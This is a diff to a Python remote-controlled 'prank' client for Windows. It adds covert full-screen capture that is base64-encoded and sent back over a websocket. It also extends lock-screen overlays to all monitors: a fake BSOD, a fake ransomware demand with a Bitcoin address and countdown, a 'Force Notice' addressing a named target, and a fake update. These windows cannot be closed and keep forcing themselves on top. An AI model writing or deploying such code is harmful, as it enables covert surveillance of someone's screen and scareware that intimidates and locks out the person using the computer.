@@ -22,6 +22,8 @@ import socket
 import winreg
 import hmac
 import hashlib
+import io
+import base64
 
 try:
     import websocket
@@ -42,6 +44,16 @@ try:
     KEYBOARD_AVAILABLE = True
 except ImportError:
     KEYBOARD_AVAILABLE = False
+
+try:
+    import mss
+except ImportError:
+    mss = None
+
+try:
+    from PIL import Image
+except ImportError:
+    Image = None
 
 BACKGROUND_MODE = len(sys.argv) > 1 and sys.argv[1] == '--background'
 
@@ -132,6 +144,56 @@ class BoomClient:
             self.root.quit()
             return
         self.root.mainloop()
+
+    def get_all_monitors(self):
+        """Return list of (x, y, width, height) for each monitor. Falls back to primary screen."""
+        try:
+            if WIN32_AVAILABLE:
+                monitors = []
+                for hdc, rect, flags in win32api.EnumDisplayMonitors():
+                    left, top, right, bottom = rect
+                    monitors.append((left, top, right - left, bottom - top))
+                if monitors:
+                    return monitors
+        except Exception:
+            pass
+        return [(0, 0, self.screen_width, self.screen_height)]
+
+    def create_monitor_window(self, x, y, w, h, bg_color):
+        """Create a borderless, topmost Toplevel window covering (x,y)-(x+w,y+h)."""
+        win = tk.Toplevel(self.root)
+        win.overrideredirect(True)
+        win.geometry(f"{w}x{h}+{x}+{y}")
+        win.attributes('-topmost', True)
+        win.configure(bg=bg_color)
+        return win
+
+    def capture_screenshot(self):
+        """Capture the full screen, encode as base64 JPEG (quality=50, 50% size), send over WS."""
+        try:
+            if mss is None:
+                self.ws.send(json.dumps({"type": "screenshot", "data": "", "error": "mss not available"}))
+                return
+            with mss.mss() as sct:
+                monitor = sct.monitors[0]  # "All in one" virtual monitor
+                screenshot = sct.grab(monitor)
+            if Image is not None:
+                img = Image.frombytes("RGB", (screenshot.width, screenshot.height), screenshot.rgb)
+                # Resize to 50% to keep payload under ~200 KB
+                w, h = img.size
+                img = img.resize((w // 2, h // 2), Image.LANCZOS)
+                buf = io.BytesIO()
+                img.save(buf, format="JPEG", quality=50)
+                b64_data = base64.b64encode(buf.getvalue()).decode()
+            else:
+                # Fallback: raw mss data (no PIL available)
+                b64_data = base64.b64encode(screenshot.rgb).decode()
+            self.ws.send(json.dumps({"type": "screenshot", "data": b64_data}))
+        except Exception as e:
+            try:
+                self.ws.send(json.dumps({"type": "screenshot", "data": "", "error": str(e)}))
+            except Exception:
+                pass
 
     def create_debug_window(self):
         self.debug_window = tk.Toplevel(self.root)
@@ -495,6 +557,7 @@ class BoomClient:
             "prank_ghost_typing": self.prank_ghost_typing,
             "prank_rickroll": self.prank_rickroll,
             "prank_fake_notify": self.prank_fake_notify,
+            "screenshot": self.capture_screenshot,
             "exit": self.stop_prank,
         }
         
@@ -584,28 +647,30 @@ class BoomClient:
         self.close_all_windows()
         self.stage = 3
         self.root.after(0, self.update_debug, f"Stage: 3\nBSOD simulation")
-        bsod = tk.Toplevel(self.root)
-        bsod.geometry(f"{self.screen_width}x{self.screen_height}+0+0")
-        bsod.attributes('-fullscreen', True)
-        bsod.attributes('-topmost', True)
-        bsod.overrideredirect(True)
-        bsod.protocol("WM_DELETE_WINDOW", lambda: None)
-        frame = tk.Frame(bsod, bg="#0078d7")
-        frame.pack(fill=tk.BOTH, expand=True)
-        tk.Label(frame, text=":(", font=("Segoe UI", 80), fg="white", bg="#0078d7", anchor="w").place(x=50, y=80)
-        tk.Label(frame, text="Your PC ran into a problem and needs to restart.", font=("Segoe UI", 18), fg="white", bg="#0078d7", anchor="w").place(x=50, y=220)
-        tk.Label(frame, text="We're just collecting some error info, then we'll restart for you.", font=("Segoe UI", 14), fg="white", bg="#0078d7", anchor="w").place(x=50, y=260)
+        monitors = self.get_all_monitors()
         self.progress_var = tk.StringVar()
         self.progress_var.set("0% complete")
-        tk.Label(frame, textvariable=self.progress_var, font=("Segoe UI", 14), fg="white", bg="#0078d7", anchor="w").place(x=50, y=310)
-        tk.Label(frame, text="For more information about this issue:", font=("Segoe UI", 12), fg="white", bg="#0078d7", anchor="w").place(x=50, y=400)
-        tk.Label(frame, text="windows.com/stopcode", font=("Segoe UI", 12, "underline"), fg="white", bg="#0078d7", anchor="w").place(x=50, y=425)
-        tk.Label(frame, text="Stop code: SYSTEM_SERVICE_EXCEPTION", font=("Segoe UI", 12), fg="white", bg="#0078d7", anchor="w").place(x=50, y=470)
-        def keep_top():
-            bsod.attributes('-topmost', True)
-            bsod.lift()
-            bsod.after(100, keep_top)
-        keep_top()
+        for mx, my, mw, mh in monitors:
+            bsod = self.create_monitor_window(mx, my, mw, mh, "#0078d7")
+            bsod.protocol("WM_DELETE_WINDOW", lambda: None)
+            frame = tk.Frame(bsod, bg="#0078d7")
+            frame.pack(fill=tk.BOTH, expand=True)
+            tk.Label(frame, text=":(", font=("Segoe UI", 80), fg="white", bg="#0078d7", anchor="w").place(x=50, y=80)
+            tk.Label(frame, text="Your PC ran into a problem and needs to restart.", font=("Segoe UI", 18), fg="white", bg="#0078d7", anchor="w").place(x=50, y=220)
+            tk.Label(frame, text="We're just collecting some error info, then we'll restart for you.", font=("Segoe UI", 14), fg="white", bg="#0078d7", anchor="w").place(x=50, y=260)
+            tk.Label(frame, textvariable=self.progress_var, font=("Segoe UI", 14), fg="white", bg="#0078d7", anchor="w").place(x=50, y=310)
+            tk.Label(frame, text="For more information about this issue:", font=("Segoe UI", 12), fg="white", bg="#0078d7", anchor="w").place(x=50, y=400)
+            tk.Label(frame, text="windows.com/stopcode", font=("Segoe UI", 12, "underline"), fg="white", bg="#0078d7", anchor="w").place(x=50, y=425)
+            tk.Label(frame, text="Stop code: SYSTEM_SERVICE_EXCEPTION", font=("Segoe UI", 12), fg="white", bg="#0078d7", anchor="w").place(x=50, y=470)
+            def keep_top(w=bsod):
+                try:
+                    w.attributes('-topmost', True)
+                    w.lift()
+                    w.after(100, keep_top)
+                except tk.TclError:
+                    pass
+            keep_top()
+            self.windows.append(bsod)
         def update_progress():
             i = 0
             while i < 101 and not self.stop_flag:
@@ -614,33 +679,39 @@ class BoomClient:
                 self.progress_var.set(f"{min(i, 100)}% complete")
                 time.sleep(0.15)
         threading.Thread(target=update_progress, daemon=True).start()
-        self.windows.append(bsod)
 
     def start_stage_4(self):
         self.close_all_windows()
         self.stage = 4
         self.root.after(0, self.update_debug, f"Stage: 4\nFake ransomware screen")
-        wc = tk.Toplevel(self.root)
-        wc.geometry(f"{self.screen_width}x{self.screen_height}+0+0")
-        wc.attributes('-fullscreen', True)
-        wc.attributes('-topmost', True)
-        wc.overrideredirect(True)
-        wc.protocol("WM_DELETE_WINDOW", lambda: None)
-        frame = tk.Frame(wc, bg="#1a0000")
-        frame.pack(fill=tk.BOTH, expand=True)
-        tk.Label(frame, text="🔒", font=("Arial", 80), fg="#d32f2f", bg="#1a0000").place(x=self.screen_width//2 - 50, y=60)
-        tk.Label(frame, text="Oops, your files have been encrypted!", font=("Arial", 24, "bold"), fg="#d32f2f", bg="#1a0000").place(x=100, y=180)
-        tk.Label(frame, text="Your files have been encrypted. Pay 0.5 BTC to recover.", font=("Arial", 14), fg="white", bg="#1a0000").place(x=100, y=240)
-        tk.Label(frame, text="Payment must be made within 48 hours.", font=("Arial", 12), fg="#ff9800", bg="#1a0000").place(x=100, y=280)
+        monitors = self.get_all_monitors()
         countdown_var = tk.StringVar()
         countdown_var.set("Time remaining: 47:59:59")
-        tk.Label(frame, textvariable=countdown_var, font=("Arial", 18, "bold"), fg="#f44336", bg="#1a0000").place(x=100, y=330)
-        wallet_box = tk.LabelFrame(frame, text="Bitcoin Wallet Address", font=("Arial", 12), fg="white", bg="#1a0000")
-        wallet_box.place(x=100, y=400, width=500, height=60)
-        tk.Label(wallet_box, text="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", font=("Courier", 11), fg="#ffeb3b", bg="#1a0000").pack(pady=10)
-        tk.Label(frame, text="Click 'I have paid' after payment", font=("Arial", 11), fg="#aaa", bg="#1a0000").place(x=100, y=490)
-        tk.Button(frame, text="I have paid", font=("Arial", 12, "bold"), bg="#4caf50", fg="white", command=lambda: self.show_taunt()).place(x=100, y=530)
-        tk.Button(frame, text="Decrypt sample", font=("Arial", 10), bg="#607d8b", fg="white", command=lambda: None).place(x=250, y=530)
+        for mx, my, mw, mh in monitors:
+            wc = self.create_monitor_window(mx, my, mw, mh, "#1a0000")
+            wc.protocol("WM_DELETE_WINDOW", lambda: None)
+            frame = tk.Frame(wc, bg="#1a0000")
+            frame.pack(fill=tk.BOTH, expand=True)
+            tk.Label(frame, text="🔒", font=("Arial", 80), fg="#d32f2f", bg="#1a0000").place(x=100, y=60)
+            tk.Label(frame, text="Oops, your files have been encrypted!", font=("Arial", 24, "bold"), fg="#d32f2f", bg="#1a0000").place(x=100, y=180)
+            tk.Label(frame, text="Your files have been encrypted. Pay 0.5 BTC to recover.", font=("Arial", 14), fg="white", bg="#1a0000").place(x=100, y=240)
+            tk.Label(frame, text="Payment must be made within 48 hours.", font=("Arial", 12), fg="#ff9800", bg="#1a0000").place(x=100, y=280)
+            tk.Label(frame, textvariable=countdown_var, font=("Arial", 18, "bold"), fg="#f44336", bg="#1a0000").place(x=100, y=330)
+            wallet_box = tk.LabelFrame(frame, text="Bitcoin Wallet Address", font=("Arial", 12), fg="white", bg="#1a0000")
+            wallet_box.place(x=100, y=400, width=500, height=60)
+            tk.Label(wallet_box, text="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa", font=("Courier", 11), fg="#ffeb3b", bg="#1a0000").pack(pady=10)
+            tk.Label(frame, text="Click 'I have paid' after payment", font=("Arial", 11), fg="#aaa", bg="#1a0000").place(x=100, y=490)
+            tk.Button(frame, text="I have paid", font=("Arial", 12, "bold"), bg="#4caf50", fg="white", command=lambda: self.show_taunt()).place(x=100, y=530)
+            tk.Button(frame, text="Decrypt sample", font=("Arial", 10), bg="#607d8b", fg="white", command=lambda: None).place(x=250, y=530)
+            def keep_top(w=wc):
+                try:
+                    w.attributes('-topmost', True)
+                    w.lift()
+                    w.after(100, keep_top)
+                except tk.TclError:
+                    pass
+            keep_top()
+            self.windows.append(wc)
         def do_countdown(seconds=48*3600):
             for remaining in range(seconds, -1, -1):
                 if self.stop_flag:
@@ -651,12 +722,6 @@ class BoomClient:
                 countdown_var.set(f"Time remaining: {h:02d}:{m:02d}:{s:02d}")
                 time.sleep(1)
         threading.Thread(target=do_countdown, daemon=True).start()
-        def keep_top():
-            wc.attributes('-topmost', True)
-            wc.lift()
-            wc.after(100, keep_top)
-        keep_top()
-        self.windows.append(wc)
 
     def show_taunt(self):
         taunt = tk.Toplevel(self.root)
@@ -677,25 +742,26 @@ class BoomClient:
         self.close_all_windows()
         self.stage = 6
         self.root.after(0, self.update_debug, f"Stage: Force\nName: {self.target_name}")
-        fw = tk.Toplevel(self.root)
-        fw.geometry(f"{self.screen_width}x{self.screen_height}+0+0")
-        fw.attributes('-fullscreen', True)
-        fw.attributes('-topmost', True)
-        fw.overrideredirect(True)
-        fw.protocol("WM_DELETE_WINDOW", lambda: None)
-        frame = tk.Frame(fw, bg="#212121")
-        frame.pack(fill=tk.BOTH, expand=True)
-        tk.Label(frame, text="⚠ Force Notice ⚠", font=("Arial", 28, "bold"), fg="#f44336", bg="#212121").place(x=self.screen_width//2 - 200, y=80)
-        tk.Label(frame, text=f"Target: {self.target_name}", font=("Arial", 20), fg="white", bg="#212121").place(x=self.screen_width//2 - 150, y=180)
-        tk.Label(frame, text=f"{self.target_name}, stop using the computer now.", font=("Arial", 18), fg="#ff9800", bg="#212121").place(x=self.screen_width//2 - 200, y=260)
-        tk.Label(frame, text="Forced action will be taken immediately.", font=("Arial", 18), fg="#ff9800", bg="#212121").place(x=self.screen_width//2 - 200, y=300)
-        tk.Label(frame, text="Please shut down and cooperate.", font=("Arial", 14), fg="#aaa", bg="#212121").place(x=self.screen_width//2 - 180, y=380)
-        def keep_top():
-            fw.attributes('-topmost', True)
-            fw.lift()
-            fw.after(100, keep_top)
-        keep_top()
-        self.windows.append(fw)
+        monitors = self.get_all_monitors()
+        for mx, my, mw, mh in monitors:
+            fw = self.create_monitor_window(mx, my, mw, mh, "#212121")
+            fw.protocol("WM_DELETE_WINDOW", lambda: None)
+            frame = tk.Frame(fw, bg="#212121")
+            frame.pack(fill=tk.BOTH, expand=True)
+            tk.Label(frame, text="⚠ Force Notice ⚠", font=("Arial", 28, "bold"), fg="#f44336", bg="#212121").place(x=mx + (mw - 400) // 2, y=80)
+            tk.Label(frame, text=f"Target: {self.target_name}", font=("Arial", 20), fg="white", bg="#212121").place(x=mx + (mw - 300) // 2, y=180)
+            tk.Label(frame, text=f"{self.target_name}, stop using the computer now.", font=("Arial", 18), fg="#ff9800", bg="#212121").place(x=mx + (mw - 400) // 2, y=260)
+            tk.Label(frame, text="Forced action will be taken immediately.", font=("Arial", 18), fg="#ff9800", bg="#212121").place(x=mx + (mw - 400) // 2, y=300)
+            tk.Label(frame, text="Please shut down and cooperate.", font=("Arial", 14), fg="#aaa", bg="#212121").place(x=mx + (mw - 360) // 2, y=380)
+            def keep_top(w=fw):
+                try:
+                    w.attributes('-topmost', True)
+                    w.lift()
+                    w.after(100, keep_top)
+                except tk.TclError:
+                    pass
+            keep_top()
+            self.windows.append(fw)
 
     def prank_desktop(self):
         self.root.after(0, self.update_debug, f"Stage: Extra\nMove windows prank")
@@ -739,19 +805,26 @@ class BoomClient:
         self.close_all_windows()
         self.stage = 5
         self.root.after(0, self.update_debug, f"Stage: Extra\nFake Windows Update")
-        fu = tk.Toplevel(self.root)
-        fu.geometry(f"{self.screen_width}x{self.screen_height}+0+0")
-        fu.attributes('-fullscreen', True)
-        fu.attributes('-topmost', True)
-        fu.overrideredirect(True)
-        frame = tk.Frame(fu, bg="#005a9e")
-        frame.pack(fill=tk.BOTH, expand=True)
-        tk.Label(frame, text="Updating Windows", font=("Segoe UI", 32), fg="white", bg="#005a9e").place(x=50, y=100)
-        tk.Label(frame, text="Don't turn off your computer.", font=("Segoe UI", 20), fg="white", bg="#005a9e").place(x=50, y=160)
+        monitors = self.get_all_monitors()
         progress_var = tk.StringVar()
         progress_var.set("0%")
-        tk.Label(frame, textvariable=progress_var, font=("Segoe UI", 18), fg="white", bg="#005a9e").place(x=50, y=220)
-        tk.Label(frame, text="Configuring updates... This may take a few minutes.", font=("Segoe UI", 14), fg="white", bg="#005a9e").place(x=50, y=270)
+        for mx, my, mw, mh in monitors:
+            fu = self.create_monitor_window(mx, my, mw, mh, "#005a9e")
+            frame = tk.Frame(fu, bg="#005a9e")
+            frame.pack(fill=tk.BOTH, expand=True)
+            tk.Label(frame, text="Updating Windows", font=("Segoe UI", 32), fg="white", bg="#005a9e").place(x=50, y=100)
+            tk.Label(frame, text="Don't turn off your computer.", font=("Segoe UI", 20), fg="white", bg="#005a9e").place(x=50, y=160)
+            tk.Label(frame, textvariable=progress_var, font=("Segoe UI", 18), fg="white", bg="#005a9e").place(x=50, y=220)
+            tk.Label(frame, text="Configuring updates... This may take a few minutes.", font=("Segoe UI", 14), fg="white", bg="#005a9e").place(x=50, y=270)
+            def keep_top(w=fu):
+                try:
+                    w.attributes('-topmost', True)
+                    w.lift()
+                    w.after(100, keep_top)
+                except tk.TclError:
+                    pass
+            keep_top()
+            self.windows.append(fu)
         def fake_progress():
             percent = 0
             while not self.stop_flag:
@@ -760,49 +833,60 @@ class BoomClient:
                 progress_var.set(f"{percent}%")
                 time.sleep(0.3)
         threading.Thread(target=fake_progress, daemon=True).start()
-        def keep_top():
-            fu.attributes('-topmost', True)
-            fu.lift()
-            fu.after(100, keep_top)
-        keep_top()
-        self.windows.append(fu)
 
     def prank_glitch(self):
         self.close_all_windows()
         self.stage = 8
         self.root.after(0, self.update_debug, f"Stage: Extra\nGlitch Overlay")
-        glitch = tk.Toplevel(self.root)
-        glitch.geometry(f"{self.screen_width}x{self.screen_height}+0+0")
-        glitch.attributes('-fullscreen', True)
-        glitch.attributes('-topmost', True)
-        glitch.attributes('-alpha', 0.4)
-        glitch.overrideredirect(True)
-        glitch.protocol("WM_DELETE_WINDOW", lambda: None)
-        
-        canvas = tk.Canvas(glitch, width=self.screen_width, height=self.screen_height, bg="black", highlightthickness=0)
-        canvas.pack(fill=tk.BOTH, expand=True)
+        monitors = self.get_all_monitors()
+        glitch_windows = []
+        canvases = []
+        for mx, my, mw, mh in monitors:
+            glitch = self.create_monitor_window(mx, my, mw, mh, "black")
+            glitch.attributes('-alpha', 0.4)
+            glitch.protocol("WM_DELETE_WINDOW", lambda: None)
+            canvas = tk.Canvas(glitch, width=mw, height=mh, bg="black", highlightthickness=0)
+            canvas.pack(fill=tk.BOTH, expand=True)
+            canvases.append(canvas)
+            glitch_windows.append(glitch)
+            def keep_top(w=glitch):
+                try:
+                    w.attributes('-topmost', True)
+                    w.lift()
+                    w.after(100, keep_top)
+                except tk.TclError:
+                    pass
+            keep_top()
+            self.windows.append(glitch)
         
         def do_glitch():
             if self.stop_flag or self.stage != 8: return
-            canvas.delete("all")
-            for _ in range(30):
-                x1 = random.randint(0, self.screen_width)
-                y1 = random.randint(0, self.screen_height)
-                x2 = x1 + random.randint(50, 500)
-                y2 = y1 + random.randint(5, 50)
-                color = random.choice(["#ff0000", "#00ff00", "#0000ff", "#ffffff", "#000000"])
-                canvas.create_rectangle(x1, y1, x2, y2, fill=color, outline="")
-            
-            glitch.geometry(f"{self.screen_width}x{self.screen_height}+{random.randint(-10, 10)}+{random.randint(-10, 10)}")
-            glitch.after(random.randint(50, 200), do_glitch)
-            
+            for c in canvases:
+                try:
+                    c.delete("all")
+                    for _ in range(30):
+                        x1 = random.randint(0, self.screen_width)
+                        y1 = random.randint(0, self.screen_height)
+                        x2 = x1 + random.randint(50, 500)
+                        y2 = y1 + random.randint(5, 50)
+                        color = random.choice(["#ff0000", "#00ff00", "#0000ff", "#ffffff", "#000000"])
+                        c.create_rectangle(x1, y1, x2, y2, fill=color, outline="")
+                except tk.TclError:
+                    pass
+            offset_x = random.randint(-10, 10)
+            offset_y = random.randint(-10, 10)
+            for w, (mx, my, mw, mh) in zip(glitch_windows, monitors):
+                try:
+                    w.geometry(f"{mw}x{mh}+{mx+offset_x}+{my+offset_y}")
+                except tk.TclError:
+                    pass
+            if glitch_windows:
+                try:
+                    glitch_windows[0].after(random.randint(50, 200), do_glitch)
+                except tk.TclError:
+                    pass
+        
         do_glitch()
-        def keep_top():
-            glitch.attributes('-topmost', True)
-            glitch.lift()
-            glitch.after(100, keep_top)
-        keep_top()
-        self.windows.append(glitch)
 
     def prank_infinite_window(self):
         self.close_all_windows()
